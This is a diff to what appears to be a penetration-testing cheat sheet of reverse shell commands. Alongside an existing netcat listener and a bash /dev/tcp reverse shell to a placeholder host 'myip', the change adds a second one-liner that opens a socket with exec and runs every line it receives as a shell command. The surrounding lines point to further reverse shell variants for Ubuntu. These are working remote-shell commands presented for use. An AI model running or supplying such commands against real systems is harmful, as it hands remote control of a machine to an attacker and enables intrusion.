@@ -27,7 +27,8 @@ nc -nvlp 1234
 
 #Reverse Shell w/o NetCat
 /bin/bash -i > /dev/tcp/myip/1234 0<&1 2>&1
-
+#or without bash assumptions
+exec 5<>/dev/tcp/myip/1234; cat <&5 | while read line; do $line 2>&5 >&5; done
 
 #Working Ubuntu Reverse Shell
 #note that you don't need to include mknod backpipe p if you have already created it
